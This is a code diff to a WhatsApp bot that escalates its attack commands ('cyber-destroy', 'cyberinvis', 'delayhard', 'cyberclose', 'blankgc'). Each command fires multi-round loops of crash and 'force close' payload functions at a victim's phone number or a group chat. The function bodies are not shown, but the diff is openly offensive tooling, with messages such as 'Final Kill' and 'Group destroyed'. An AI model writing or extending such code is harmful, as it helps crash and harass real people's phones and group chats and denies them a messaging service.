@@ -13952,20 +13952,50 @@ case 'cyber-destroy': {
     }
 
     let target = targetNumber + "@s.whatsapp.net";
-    reply(`💀 *Target:* ${targetNumber}\n⚡ *Attack initiated*`);
+    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *3 Round Attack Launching...*`);
 
-    // Run all combo functions
-    await Combo(target);           // Your combo with callinvisible, ForceXFrezee, blank1
-    await sleep(2000);
-    await fcnew(target);           // Your fcnew with CarouselVY4, LocaXotion, XinsooInvisV1
-    await sleep(2000);
-    await XPhone(target);          // Your XPhone with many functions
-    await sleep(2000);
-    await BayuOfficialHard(target); // Your BayuOfficialHard with protoXimg, bulldozer, etc
-    await sleep(2000);
-    await ForceClose(target);      // Your ForceClose with forclose
-    
-    reply(`✅ *Attack completed on ${targetNumber}*`);
+    try {
+        // Round 1
+        await CYBEReress();
+        await sleep(300);
+        await Combo(target);
+        await sleep(300);
+        await fcnew(target);
+        await sleep(300);
+        await XPhone(target);
+        await sleep(500);
+
+        // Round 2
+        await BayuOfficialHard(target);
+        await sleep(300);
+        await Combo(target);
+        await sleep(300);
+        await fcnew(target);
+        await sleep(300);
+        for (let i = 0; i < 10; i++) {
+            await ForceClose(target);
+            await sleep(150);
+        }
+        await sleep(500);
+
+        // Round 3 — Final Kill
+        await Combo(target);
+        await sleep(300);
+        await fcnew(target);
+        await sleep(300);
+        await XPhone(target);
+        await sleep(300);
+        await BayuOfficialHard(target);
+        await sleep(300);
+        for (let i = 0; i < 10; i++) {
+            await ForceClose(target);
+            await sleep(150);
+        }
+
+        reply(`✅ *CYBER-DESTROY complete — 3 rounds done on ${targetNumber}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'error'}*`);
+    }
     break;
 }
 
@@ -13985,14 +14015,34 @@ case "cyberinvis": {
     }
     
     let target = pepec + '@s.whatsapp.net';
-    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);
+    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔥 *Launching full attack...*`);
 
-    await CYBEReress();
-    await Combo(target);
-    await fcnew(target);
-    await Combo(target);
-    await fcnew(target);
-    await XPhone(target);
+    try {
+        await CYBEReress();
+        await sleep(500);
+        await Combo(target);
+        await sleep(500);
+        await fcnew(target);
+        await sleep(500);
+        await Combo(target);
+        await sleep(500);
+        await fcnew(target);
+        await sleep(500);
+        await Combo(target);
+        await sleep(500);
+        await fcnew(target);
+        await sleep(500);
+        await XPhone(target);
+        await sleep(500);
+        await BayuOfficialHard(target);
+        await sleep(500);
+        await ForceClose(target);
+        await sleep(500);
+        await ForceClose(target);
+        reply(`✅ *Attack completed on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial execution: ${e.message || 'Error'}*`);
+    }
     
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
@@ -14011,18 +14061,33 @@ case "delayhard": {
     }
     
     let target = pepec + '@s.whatsapp.net';
-    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);
+    reply(`💀 *Target:* ${pepec}\n⚡ *DELAYHARD — MAXIMUM POWER*\n🔥 *Initiating full barrage...*`);
 
-    await CYBEReress();
-    await fcnew(target);
-    await fcnew(target);
-    await Combo(target);
-    await Combo(target);
-    await fcnew(target);
-    await fcnew(target);
-    await Combo(target);
-    await Combo(target);
-    await XPhone(target);
+    try {
+        await CYBEReress();
+        await sleep(300);
+        for (let round = 0; round < 3; round++) {
+            await fcnew(target);
+            await sleep(300);
+            await fcnew(target);
+            await sleep(300);
+            await Combo(target);
+            await sleep(300);
+            await Combo(target);
+            await sleep(300);
+        }
+        await XPhone(target);
+        await sleep(300);
+        await BayuOfficialHard(target);
+        await sleep(300);
+        for (let i = 0; i < 5; i++) {
+            await ForceClose(target);
+            await sleep(200);
+        }
+        reply(`✅ *DELAYHARD complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
+    }
     
     await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
 }
@@ -14038,21 +14103,38 @@ case "cyberclose": {
     let pepec = args[0].replace(/[^0-9]/g, "");
     
     // 🔒 PROTECTED NUMBERS CHECK
-    let protectedNumbers = ["8087253512"];
+    let protectedNumbers = ["8087253512", "923417022212"];
     if (protectedNumbers.includes(pepec)) {
         return reply("🔒 *Protected*");
     }
     
     let target = pepec + '@s.whatsapp.net';
-    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);
+    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔒 *Force closing WhatsApp...*`);
 
-    await CYBEReress();
-    
-    for (let i = 0; i < 7; i++) {
-        await ForceClose(target);
+    try {
+        await CYBEReress();
+        await sleep(300);
+        await Combo(target);
+        await sleep(300);
+        for (let i = 0; i < 15; i++) {
+            await ForceClose(target);
+            await sleep(150);
+        }
+        await sleep(500);
+        await fcnew(target);
+        await sleep(300);
+        await XPhone(target);
+        await sleep(300);
+        await BayuOfficialHard(target);
+        await sleep(300);
+        for (let i = 0; i < 5; i++) {
+            await ForceClose(target);
+            await sleep(150);
+        }
+        reply(`✅ *Force close complete on ${pepec}*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
-    
-    await XPhone(target);
     
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
@@ -14068,12 +14150,20 @@ case 'blankgc': {
     if (!isOwner) return reply(`🔒 *Owner only*`);
     if (!m.isGroup) return reply('👥 *Groups only*');
     
-    reply(`💀 *Destroying group...*`);
+    reply(`💀 *GROUP DESTROY INITIATED*\n⚡ *Command:* ${command}\n🔥 *Hold tight...*`);
     
-    for (let i = 0; i < 20; i++) {
-        await bug3(m.chat);
-        await sleep(2000);
-        await bug3(m.chat);             
+    try {
+        for (let i = 0; i < 30; i++) {
+            await bug3(m.chat);
+            await sleep(1000);
+            await bug3(m.chat);
+            await sleep(1000);
+            await bug3(m.chat);
+            await sleep(800);
+        }
+        reply(`✅ *Group destroyed — ${command} complete*`);
+    } catch(e) {
+        reply(`⚠️ *Partial run: ${e.message || 'Error'}*`);
     }
 }
 break;
